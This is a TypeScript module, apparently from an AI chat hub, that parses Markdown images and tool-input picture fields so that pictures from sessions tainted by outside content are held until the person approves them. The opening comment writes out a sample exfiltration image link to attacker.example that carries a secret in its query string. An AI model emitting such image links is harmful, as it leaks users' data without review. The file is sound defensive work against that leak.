// Pictures (docs/superpowers/specs/2026-11-02-picture-egress-design.md). The hub fetches every picture a chat shows
// (/api/media), so a reply with ![x](https://attacker.example/p.png?d=<secret>) would carry data out the moment it is
// shown: no tool call, no review. So the hub decides about a picture when the content holding it is stored, where the
// session is known: shown when it carries nothing new by the tainted-egress rule (policy/egress.ts), held otherwise.
// The verdict is kept per address; the proxy fetches only shown ones, and a held one waits for the person's tap.

import type { MessagePart } from "@piomio/shared";
import { tx, type Db } from "../db.ts";
import { parseImageUrl } from "../media.ts";
import type { EgressGiven, EgressGuard } from "./egress.ts";

export type PictureState = "shown" | "held";

/** Fields of a tool's input that hold a picture's address; `url`/`src`/`href` count inside them (show_images' items). */
const PICTURE_KEYS = /^(?:image|images|img|picture|pictures|photo|photos|cover|thumbnail|poster|icon)$/i;
const ADDRESS_KEYS = /^(?:url|src|href)$/i;
/** The longest destination read after "](": the proxy takes addresses up to 2048 characters. */
const MAX_DEST = 2100;
/** How far an image's alt text is followed looking for its "](": a stray "![" costs no more. */
const MAX_ALT = 1000;
const ENTITIES: Record<string, string> = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: " " };

/** A destination after "](": in <angle brackets>, or up to a space or the unbalanced ")". */
const DEST = /^[ \t]*\n?[ \t]*(?:<([^<>\n]+)>|((?:[^\s()\\]|\\.|\((?:[^\s()\\]|\\.)*\))+))/;
/** A reference definition an image may point to: `[label]: url`. */
const DEFINITION = /^ {0,3}\[[^\]\n]+\]:[ \t]*\n?[ \t]*<?([^\s<>]+)>?/gm;

function entities(s: string): string {
  return s.replace(/&(#x[0-9a-f]{1,6}|#\d{1,7}|[a-z]{2,6});/gi, (m, e: string) => {
    if (e[0] !== "#") return ENTITIES[e.toLowerCase()] ?? m;
    const n = e[1] === "x" || e[1] === "X" ? parseInt(e.slice(2), 16) : parseInt(e.slice(1), 10);
    return n > 0 && n <= 0x10ffff ? String.fromCodePoint(n) : m;
  });
}

/** The addresses (as the proxy compares them) a destination may stand for: as written, unescaped, entities decoded. */
function hrefs(raw: string): string[] {
  const unescaped = raw.replace(/\\([!-/:-@[-`{-~])/g, "$1");
  const out = new Set<string>();
  for (const v of [raw, unescaped, entities(unescaped)]) {
    const href = parseImageUrl(v.trim())?.href;
    if (href) out.add(href);
  }
  return [...out];
}

/**
 * The web pictures a Markdown text shows: the destinations of its images (`![alt](url "title")`, `![alt](<url>)`) and
 * of its reference definitions (`[r]: url`, which an `![alt][r]` may use). What a parser reads differently stays
 * undecided, which holds it: never shown by mistake.
 */
export function markdownPictures(text: string): string[] {
  const out = new Set<string>();
  const add = (raw: string | undefined) => {
    if (raw) for (const h of hrefs(raw)) out.add(h);
  };
  for (let i = text.indexOf("!["); i >= 0; i = text.indexOf("![", i + 2)) {
    let depth = 0;
    let j = i + 1;
    for (const end = Math.min(text.length, i + MAX_ALT); j < end; j++) {
      const c = text[j];
      if (c === "\\") j++;
      else if (c === "[") depth++;
      else if (c === "]" && --depth === 0) break;
    }
    if (text[j] !== "]" || text[j + 1] !== "(") continue;
    const m = DEST.exec(text.slice(j + 2, j + 2 + MAX_DEST));
    if (m) add(m[1] ?? m[2]);
  }
  if (text.includes("]:")) for (const m of text.matchAll(DEFINITION)) add(m[1]);
  return [...out];
}

/** The pictures a tool's input would show: picture fields (`image`, `cover`, `images[].url`…) and Markdown images in any text. */
export function picturesIn(input: unknown): string[] {
  const out = new Set<string>();
  const walk = (v: unknown, picture: boolean, depth: number) => {
    if (depth > 8) return;
    if (typeof v === "string") {
      if (picture) for (const h of hrefs(v)) out.add(h);
      if (v.includes("![") || v.includes("]:")) for (const h of markdownPictures(v)) out.add(h);
    } else if (Array.isArray(v)) for (const x of v) walk(x, picture, depth + 1);
    else if (v && typeof v === "object") {
      for (const [k, x] of Object.entries(v)) walk(x, PICTURE_KEYS.test(k) || (picture && ADDRESS_KEYS.test(k)), depth + 1);
    }
  };
  walk(input, false, 0);
  return [...out];
}

/** The web pictures stored message parts show: `images` items, news cards' pictures, Markdown in words and notes. */
export function partPictures(parts: MessagePart[]): string[] {
  const out = new Set<string>();
  const add = (urls: string[]) => urls.forEach((u) => out.add(u));
  for (const p of parts) {
    if (p.type === "images") for (const it of p.items) add(hrefs(it.src));
    else if (p.type === "news") for (const it of p.items) add(it.image ? hrefs(it.image) : []);
    else if (p.type === "text") add(markdownPictures(p.text));
    else if (p.type === "notification") add(markdownPictures(p.body));
  }
  return [...out];
}

/** A session as far as its pictures go. */
export interface PictureSession {
  id: string;
  tainted: boolean;
}

/** The verdicts, one per address (`pictures` table). */
export class Pictures {
  private db: Db;
  private guard: EgressGuard;

  constructor(db: Db, guard: EgressGuard) {
    this.db = db;
    this.guard = guard;
  }

  /** The verdict on an address, as the proxy is asked for it; undefined when the hub never decided. */
  state(raw: unknown): PictureState | undefined {
    const href = parseImageUrl(raw)?.href;
    if (!href) return undefined;
    const r = this.db.prepare("select state from pictures where url = ?").get(href) as { state: PictureState } | undefined;
    return r?.state;
  }

  /**
   * Pictures in what a session made for the person (its words, a tool's input). Before outside content reached it, all
   * are shown; after, those whose address carries nothing new (EgressGuard.check), the rest are held.
   */
  decide(s: PictureSession, urls: string[], given: () => EgressGiven): void {
    let g: EgressGiven | undefined;
    for (const href of urls) {
      if (this.state(href) === "shown") continue;
      const risk = s.tainted ? this.guard.check(s.id, [href], () => (g ??= given())) : undefined;
      this.put(href, risk ? "held" : "shown");
    }
  }

  /** The person's own pictures (their message): shown. */
  trust(urls: string[]): void {
    for (const href of urls) this.put(href, "shown");
  }

  /** The person asked to see a held picture. False for an address the proxy would not take. */
  show(raw: unknown): boolean {
    const href = parseImageUrl(raw)?.href;
    if (!href) return false;
    this.put(href, "shown");
    return true;
  }

  /**
   * Content stored before pictures were decided counts as shown (the hub fetched them as the chat showed them), once:
   * messages, tasks' results, notifications, channel posts and page covers.
   */
  backfill(): void {
    if (this.db.prepare("select 1 from meta where key = 'pictures.backfilled'").get()) return;
    const urls = new Set<string>();
    const add = (list: string[]) => list.forEach((u) => urls.add(u));
    const rows = (sql: string) => this.db.prepare(sql).all() as Array<Record<string, string | null>>;
    for (const r of rows("select parts from messages where parts like '%http%'")) {
      try {
        add(partPictures(JSON.parse(r.parts ?? "[]") as MessagePart[]));
      } catch {
        // A row that does not parse shows nothing either.
      }
    }
    for (const r of rows("select result as t from tasks where result like '%http%' union all select body from notifications where body like '%http%'")) add(markdownPictures(r.t ?? ""));
    for (const r of rows("select image, text from feed_posts")) add([...hrefs(r.image ?? ""), ...markdownPictures(r.text ?? "")]);
    for (const r of rows("select cover from pages where cover is not null")) add(hrefs(r.cover ?? ""));
    tx(this.db, () => {
      for (const u of urls) this.put(u, "shown");
      this.db.prepare("insert or replace into meta(key, value) values ('pictures.backfilled', ?)").run(new Date().toISOString());
    });
  }

  /** Shown wins: a picture that went out (or was found, or given) carries nothing new however it is shown again. */
  private put(href: string, state: PictureState): void {
    this.db
      .prepare("insert into pictures(url, state, at) values (?, ?, ?) on conflict(url) do update set state = excluded.state, at = excluded.at where excluded.state = 'shown' and pictures.state <> 'shown'")
      .run(href, state, new Date().toISOString());
  }
}
